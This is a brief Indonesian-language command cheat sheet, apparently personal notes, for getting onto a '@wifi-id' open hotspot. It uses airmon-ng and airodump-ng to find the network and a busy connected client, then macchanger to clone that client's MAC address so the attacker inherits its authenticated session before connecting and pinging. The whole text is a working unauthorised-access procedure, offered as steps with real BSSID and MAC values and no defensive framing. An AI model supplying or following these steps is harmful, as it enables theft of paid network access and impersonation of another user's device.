[-] posisi belum terkoneksi.
$ airmon-ng                                    ---> check wlan0 ada tidak.
$ airmon-ng start wlan0                        ---> check mon0 ada tidak.
$ airodump-ng mon0                             ---> check ENC: OPN, @wifi-id.
$ airodump-ng mon0 --bssid E8:DE:27:9B:D6:C9   ---> bssid.
$ ifconfig wlan0 down
$ macchanger -m 10:08:B1:91:DE:F1 wlan0        ---> ini STATION, Frames: terbesar.

[+] koneksikan @wifi-id.
$ ifconfig wlan0 up
$ ping google.com
$ ping 8.8.8.8
